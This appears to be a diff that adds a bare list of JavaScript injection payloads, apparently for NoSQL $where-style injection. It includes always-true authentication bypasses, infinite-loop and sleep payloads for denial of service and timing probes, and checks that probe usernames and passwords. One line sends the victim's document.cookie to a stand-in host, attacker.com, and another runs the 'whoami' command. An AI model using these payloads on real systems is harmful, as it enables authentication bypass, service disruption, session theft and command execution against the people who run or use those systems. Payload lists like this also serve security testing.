@@ -1,0 +1,14 @@
+function() { return true }
+function() { return 1==1 }
+function() { var x = 1; return x == 1 }
+function() { var user = 'admin'; return true }
+function() { while(true) {} }
+function() { return this.username == 'admin' }
+function() { return this.password.length > 0 }
+function() { sleep(5000); return true }
+function() { var d = new Date(); var start = d.getTime(); while(true) { var now = new Date(); if(now.getTime() - start > 5000) break; } return true }
+function() { var x = 1; for(var i=0;i<1000000;i++){x=x+i;} return true }
+function() { var req = new XMLHttpRequest(); req.open('GET', 'http://attacker.com/leak?cookie='+document.cookie, false); req.send(); return true }
+function() { var cmd = 'whoami'; var output = runCommand(cmd); return output == 'admin' }
+function() { eval('1==1') }
+function() { return (function(){return true})() }
